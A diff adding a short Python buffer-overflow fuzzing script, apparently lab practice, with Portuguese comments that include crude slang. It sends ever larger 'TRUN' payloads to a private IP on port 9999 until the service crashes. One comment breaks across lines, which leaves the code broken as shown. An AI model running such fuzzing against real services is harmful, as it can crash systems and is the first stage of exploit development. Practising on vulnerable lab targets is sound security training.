@@ -1,0 +1,26 @@
+import sys
+import socket
+from time import sleep
+
+buffer = b"m" * 10000
+
+while True:
+    try:
+        ## Tentando me conectar ao IP da vitima e tambem a porta dos desesperados
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('10.11.10.62', 9999))
+
+        ## Enviar uma mensagem e o buffer
+        s.send(b"TRUN /.:/" +buffer)
+        s.close()
+        print("estamos fazendo fuzzing em %s bytes" % str(len(buffer)))
+        sleep(1)
+
+        ## Enquanto houver uma con
+contunua lascando o pau.. ou seja enviando os "M"
+        buffer += b"m" * 10000
+
+    except:
+        ## Exibir onde ocorreu o travamento
+        print("aonde o fuzzing quebrou foi %s bytes" % str(len(buffer)))
+        sys.exit()
